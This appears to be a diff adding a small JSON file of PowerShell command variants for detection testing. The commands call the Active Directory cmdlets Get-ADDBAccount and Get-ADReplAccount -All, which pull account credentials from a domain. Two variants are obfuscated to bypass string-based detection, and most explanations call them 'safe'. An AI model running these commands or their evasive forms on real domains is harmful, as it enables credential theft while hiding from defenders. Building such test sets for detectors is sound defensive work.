@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"& ('Ge'+'t-ADDBAc'+'count')\"",
+    "explanation": "This command uses string concatenation to bypass simple string-based detection while still executing the same cmdlet. It is a safe mutation technique for testing."
+  },
+  {
+    "output": "powershell.exe -Command \"Get-ADDBAccount\"",
+    "explanation": "This is a direct execution of the cmdlet, unchanged from the original. It is included for completeness in testing."
+  },
+  {
+    "output": "powershell.exe -Command \"& {Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart('\\')}\"",
+    "explanation": "This command uses a script block and environment variable to obfuscate the command while maintaining functionality. It is a safe mutation technique for testing."
+  }
+]
